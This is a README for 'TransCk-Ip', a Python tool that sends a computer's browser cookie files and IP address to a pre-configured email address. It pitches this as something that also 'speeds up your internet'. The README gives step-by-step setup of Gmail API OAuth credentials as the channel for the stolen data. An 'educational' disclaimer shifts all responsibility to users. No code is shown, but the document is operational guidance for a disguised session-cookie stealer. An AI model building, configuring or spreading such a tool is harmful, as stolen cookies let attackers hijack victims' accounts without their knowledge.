# TransCk-Ip - vDoan

## Table of Contents
- [Purpose](#purpose)
- [Installation](#installation)
- [Setup Credentials](#setup-credentials)
- [Disclaimer](#disclaimer)
- [Contact](#contact)

---

## Purpose

This software is developed for educational and research purposes. It allows users to send cookie files and IP address from their computers to a pre-configured email address AND speed up your internet :Đ . The use of this software must comply with applicable laws and regulations.

## Installation

### Required Libraries
This software requires the following third-party libraries:
- `os`
- `base64`
- `email.message`
- `google.oauth2.credentials`
- `googleapiclient.discovery`
- `google_auth_oauthlib.flow`
- `google.auth.transport.requests`
- `ctypes`
- `subprocess`
- `sys`
- `requests`
- `json`
- `selenium`
- `webdriver_manager.chrome`

To install the required libraries, run:

```bash
pip install requests selenium webdriver-manager
```


###Setup Credentials
- Follow these steps to create Credentials.json and Token.json:

1. Visit: Google Cloud Console
2. Create a new project or use an existing project.
3. In the navigation menu:
    + Go to APIs & Services
    + Library -> Search for "Gmail API" and enable it.
    + OAuth consent screen -> Check the External box -> Click Create.
    + Fill in the necessary information.
    + In Scopes -> Click Add or Remove Scopes -> Add "https://www.googleapis.com/auth/gmail.send" and check the box -> Click Update.
    + Add users by entering their Gmail addresses (these addresses will receive information from your PC).
    + Go to Credentials -> Click Create Credentials -> Choose OAuth client ID -> Select Desktop app and fill in the name -> Click Create -> Download Credentials.json.
4. After downloading, place Credentials.json in the same directory as main.py. Run main.py, and it will redirect you to a browser to log in (the email must match the user you added in the previous step).
5. Change the website and receive mail in main.py.
6. Done!

## Disclaimer

By using this software, you agree to the following terms:

1. **Personal Use**: The software is intended for personal educational and research purposes only. We are not responsible for any damages resulting from the use of this software.

2. **Privacy**: Users should protect their privacy. We do not collect personal information or cookies without your consent. You are fully responsible for sending cookie files and any related information.

3. **Limitation of Liability**: We are not liable for any loss, damage, or consequences arising from the use of this software. The use of the software is entirely at your own risk, and you are responsible for your actions.

4. **Legal Compliance**: Users are responsible for ensuring that their use of this software does not violate any laws or regulations in their jurisdiction.

## Contact

If you have any questions or requests related to this software, please contact us at: banvandoanpt@gmail.com.
